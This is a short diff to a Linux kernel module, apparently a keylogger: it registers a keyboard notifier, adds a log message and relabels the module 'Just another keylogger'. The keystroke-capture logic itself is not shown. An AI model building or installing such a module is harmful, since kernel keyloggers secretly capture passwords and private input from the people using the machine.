@@ -115,6 +115,7 @@ static int __init kl_init(void) {
     printk(KERN_ALERT "Unable to register char device %d\n",major);
     return major;
   }
+  printk(KERN_INFO "Registered %s with major %d\n",DEVICE_NAME,major);
   register_keyboard_notifier(&nb);
   sema_init(&sem,1);
   return 0;
@@ -128,4 +129,4 @@ module_exit(kl_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Alex Jones <jonesax@hush.com>");
-MODULE_DESCRIPTION("Example");
+MODULE_DESCRIPTION("Just another keylogger");
